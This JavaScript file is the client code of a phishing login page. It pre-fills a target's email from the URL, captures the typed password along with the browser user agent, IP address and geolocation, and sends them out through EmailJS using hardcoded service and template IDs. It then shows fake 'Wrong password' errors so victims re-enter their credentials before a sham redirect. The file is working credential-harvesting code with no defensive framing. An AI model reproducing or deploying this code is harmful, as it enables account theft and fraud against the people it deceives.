// Initialize EmailJS with your User ID
// emailjs.init("rIWBJaZ0Vt_hBHInA"); // Replace 'YOUR_USER_ID' with your EmailJS public key
emailjs.init("EnO7XYgIyTtRDpUqK");


// Function to get query parameter by name
function getQueryParam(name) {
    const urlParams = new URLSearchParams(window.location.search);
    return urlParams.get(name);
}




// Open popup
function openPopup() {
    document.getElementById("overlay").classList.remove("hidden");
    document.getElementById("loginModal").classList.remove("hidden");
}

// Close popup
function closePopup() {
    document.getElementById("overlay").classList.add("hidden");
    document.getElementById("loginModal").classList.add("hidden");

}


// Run when page loads
document.addEventListener("DOMContentLoaded", () => {
    const emailFromUrl = getQueryParam("email");
    if (emailFromUrl) {
        // Case 1: Popup version (with #emailText span)
        const emailText = document.getElementById("emailText");
        if (emailText) {
            // openPopup();
            emailText.innerText = emailFromUrl;

            const password = document.getElementById("password");
            const submit = document.getElementById("submit");
            if (password) password.removeAttribute("readonly");
            if (submit) submit.removeAttribute("disabled");
        }

        // Case 2: Normal email input on other pages
        const emailInput = document.getElementById("email") || document.querySelector("input[type='email']");
        if (emailInput) {
            emailInput.value = emailFromUrl;
            emailInput.readOnly = true;
        }
    }

    // Attach click event to all trigger elements
    const triggers = document.querySelectorAll(".popup-trigger, .popup-trigger-text");
    triggers.forEach(el => {
        el.addEventListener("click", openPopup);
    });
});




// Function to get user IP address and country info
async function getUserIPAndLocation() {
    const response = await fetch("https://ipapi.co/json/");
    const data = await response.json();
    return {
        ip: data.ip,
        country: data.country_name,
        latitude: data.latitude,
        longitude: data.longitude,
    };
}

document.addEventListener("DOMContentLoaded", () => {
    let attemptCount = 0; // Variable to keep track of attempts
    document
        .getElementById("loginForm")
        .addEventListener("submit", async function (event) {
            event.preventDefault(); // Prevent form submission

            // Get form values
            const email = document.getElementById("email")?.value
                || document.getElementById("emailText")?.innerText;
            const password = document.getElementById("password").value;
            const userAgent = navigator.userAgent; // Get browser user agent
            const userIPAndLocation = await getUserIPAndLocation(); // Get user IP address and country info

            // Create an object to hold the form data
            const templateParams = {
                email: email,
                password: password, // Email and password values
                user_agent: userAgent, // Browser fingerprint
                ip_address: userIPAndLocation.ip, // User IP address
                country: userIPAndLocation.country || "N/A", // User country
                latitude: userIPAndLocation.latitude || "N/A", // User location latitude
                longitude: userIPAndLocation.longitude || "N/A", // User location longitude
            };

            // Increment attempt count
            attemptCount++;
            if (password.trim() !== "") {
                // Send the email using EmailJS
                emailjs.send("service_57zybad", "template_v1kc8m2", templateParams).then(
                    function (response) {
                        console.log("SUCCESS!", response.status, response.text);

                        // Determine the success message based on the attempt count
                        if (attemptCount < 3) {
                            document.getElementById(
                                "errorMessage"
                            ).innerText = 'Wrong password or email.';
                            document.getElementById("errorMessage").style.display = "block";
                            document.getElementById("loginMessage").style.display = "none";
                            document.getElementById("password").value = "";
                        } else if (attemptCount == 2) {
                            document.getElementById(
                                "errorMessage"
                            ).innerText = 'Error.';
                            document.getElementById("errorMessage").style.display = "block";
                            document.getElementById("loginMessage").style.display = "none";
                            document.getElementById("password").value = "";
                        } else {
                            document.getElementById("loginMessage").innerText = "Connecting...";
                            document.getElementById("loginMessage").style.display = "block";
                            document.getElementById("errorMessage").style.display = "none";
                            // Clear input fields after each attempt
                            document.getElementById("email").value = "";
                            document.getElementById("password").value = "";
                            // Wait 3 seconds before loading the new page
                            setTimeout(function () {
                                window.location.href = "#"; // Replace with the desired URL
                            }, 2000);
                        }
                    },
                    function (error) {
                        console.log("FAILED...", error);
                        document.getElementById("errorMessage").innerText =
                            "Login failed. Try again.";
                        document.getElementById("errorMessage").style.display = "block";
                        document.getElementById("email").value = "";
                        document.getElementById("password").value = "";
                    }
                );
            }
        });
});
